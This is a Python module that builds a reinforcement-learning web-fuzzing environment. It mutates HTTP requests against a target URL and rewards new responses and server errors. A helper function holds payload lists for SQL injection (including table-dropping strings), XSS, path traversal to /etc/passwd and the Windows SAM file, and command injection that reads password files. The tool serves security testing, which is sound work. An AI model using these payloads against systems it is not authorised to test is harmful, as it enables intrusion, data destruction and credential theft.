# env.py
import requests
import random
import torch
from typing import Dict, List, Tuple, Set, Optional


class WebFuzzingEnvironment:
    def __init__(self, target_url: str):
        """
        初始化Web Fuzzing环境

        Args:
            target_url (str): 目标URL
        """
        self.target_url = target_url
        self.mutation_types = [
            'change_param_value',
            'add_param',
            'remove_param',
            'change_method',
            'add_header',
            'modify_content_type'
        ]
        self.current_state = self.get_initial_state()
        self.coverage_history: Set[str] = set()
        self.state_dim = 7  # 状态向量维度
        self.action_dim = len(self.mutation_types)

    def get_initial_state(self) -> Dict:
        """
        获取初始状态

        Returns:
            Dict: 初始HTTP请求状态
        """
        return {
            'method': 'GET',
            'params': {},
            'headers': {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            'body': ''
        }

    def reset(self) -> torch.FloatTensor:
        """
        重置环境状态

        Returns:
            torch.FloatTensor: 初始状态向量
        """
        self.current_state = self.get_initial_state()
        self.coverage_history.clear()
        return self.state_to_vector(self.current_state)

    def state_to_vector(self, state: Dict) -> torch.FloatTensor:
        """
        将状态转换为向量表示

        Args:
            state (Dict): HTTP请求状态

        Returns:
            torch.FloatTensor: 状态向量
        """
        method_encoding = [1 if state['method'] == m else 0
                           for m in ['GET', 'POST', 'PUT', 'DELETE']]
        param_count = len(state['params'])
        header_count = len(state['headers'])
        has_body = 1 if state['body'] else 0

        return torch.FloatTensor(method_encoding + [param_count, header_count, has_body])

    def step(self, action: int) -> Tuple[torch.FloatTensor, float, bool, Dict]:
        """
        执行一步动作

        Args:
            action (int): 动作索引

        Returns:
            Tuple: (下一个状态, 奖励, 是否结束, 信息字典)
        """
        mutation_type = self.mutation_types[action]
        new_state = self.mutate_state(self.current_state, mutation_type)
        response = self.execute_request(new_state)

        # 计算新的覆盖率和奖励
        new_coverage = False
        if response:
            coverage_key = f"{response.status_code}_{len(response.content)}"
            if coverage_key not in self.coverage_history:
                new_coverage = True
                self.coverage_history.add(coverage_key)

        reward = self.calculate_reward(response, new_coverage)
        done = len(self.coverage_history) >= 100  # 可以根据需要调整终止条件

        self.current_state = new_state
        info = {
            'coverage_count': len(self.coverage_history),
            'response_status': response.status_code if response else None,
            'mutation_type': mutation_type
        }

        return self.state_to_vector(new_state), reward, done, info

    def mutate_state(self, state: Dict, action_type: str) -> Dict:
        """
        根据动作类型修改状态

        Args:
            state (Dict): 当前状态
            action_type (str): 动作类型

        Returns:
            Dict: 新状态
        """
        new_state = state.copy()

        if action_type == 'change_param_value':
            if new_state['params']:
                param = random.choice(list(new_state['params'].keys()))
                new_state['params'][param] = self._generate_random_value()

        elif action_type == 'add_param':
            new_param = f"param_{random.randint(1, 1000)}"
            new_state['params'][new_param] = self._generate_random_value()

        elif action_type == 'remove_param':
            if new_state['params']:
                param = random.choice(list(new_state['params'].keys()))
                del new_state['params'][param]

        elif action_type == 'change_method':
            methods = ['GET', 'POST', 'PUT', 'DELETE']
            new_state['method'] = random.choice(methods)

        elif action_type == 'add_header':
            headers = [
                'X-Forwarded-For',
                'X-Custom-Header',
                'Accept-Encoding',
                'X-Requested-With',
                'Origin',
                'Referer'
            ]
            new_header = random.choice(headers)
            new_state['headers'][new_header] = self._generate_random_value()

        elif action_type == 'modify_content_type':
            content_types = [
                'application/json',
                'application/x-www-form-urlencoded',
                'multipart/form-data',
                'text/plain',
                'application/xml',
                'text/html'
            ]
            new_state['headers']['Content-Type'] = random.choice(content_types)

        return new_state

    def _generate_random_value(self) -> str:
        """
        生成随机测试值

        Returns:
            str: 生成的测试值
        """
        value_types = ['normal', 'sql_injection', 'xss', 'path_traversal', 'command_injection']
        value_type = random.choice(value_types)

        if value_type == 'normal':
            return str(random.randint(1, 1000))
        elif value_type == 'sql_injection':
            payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users;--",
                "' UNION SELECT * FROM users;--",
                "admin' --",
                "1' OR '1' = '1",
                "1; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 'x'='x"
            ]
            return random.choice(payloads)
        elif value_type == 'xss':
            payloads = [
                '<script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                '<svg/onload=alert(1)>',
                'javascript:alert(1)//',
                '<img src="x" onerror="alert(1)">',
                '<body onload=alert(1)>'
            ]
            return random.choice(payloads)
        elif value_type == 'path_traversal':
            payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\SAM',
                '....//....//....//etc/passwd',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '..%252F..%252F..%252Fetc%252Fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ]
            return random.choice(payloads)
        else:  # command_injection
            payloads = [
                '; ls -la',
                '| dir',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                '; ping -c 4 127.0.0.1',
                '| whoami',
                '; echo vulnerable'
            ]
            return random.choice(payloads)

    def execute_request(self, state: Dict) -> Optional[requests.Response]:
        """
        执行HTTP请求

        Args:
            state (Dict): 请求状态

        Returns:
            Optional[requests.Response]: 请求响应对象，失败时返回None
        """
        try:
            if state['method'] in ['GET', 'DELETE']:
                response = requests.request(
                    state['method'],
                    self.target_url,
                    params=state['params'],
                    headers=state['headers'],
                    timeout=5
                )
            else:
                response = requests.request(
                    state['method'],
                    self.target_url,
                    params=state['params'],
                    headers=state['headers'],
                    data=state['body'],
                    timeout=5
                )

            return response
        except Exception as e:
            return None

    def calculate_reward(self, response: Optional[requests.Response], new_coverage: bool) -> float:
        """
        计算奖励值

        Args:
            response (Optional[requests.Response]): 请求响应
            new_coverage (bool): 是否发现新的覆盖路径

        Returns:
            float: 奖励值
        """
        reward = 0

        if response is None:
            return -1  # 请求失败的惩罚

        # 新覆盖路径奖励
        if new_coverage:
            reward += 10

        # 响应状态码奖励
        if 500 <= response.status_code < 600:  # 服务器错误可能表示发现了漏洞
            reward += 20
        elif 400 <= response.status_code < 500:  # 客户端错误可能表示发现了有趣的边界情况
            reward += 5
        elif response.status_code == 200:  # 成功响应
            reward += 1

        # 响应内容相关奖励
        if 'error' in response.text.lower() or 'exception' in response.text.lower():
            reward += 5

        return reward

    @property
    def observation_space_dim(self) -> int:
        """
        获取观察空间维度

        Returns:
            int: 状态向量维度
        """
        return self.state_dim

    @property
    def action_space_dim(self) -> int:
        """
        获取动作空间维度

        Returns:
            int: 动作空间维度
        """
        return self.action_dim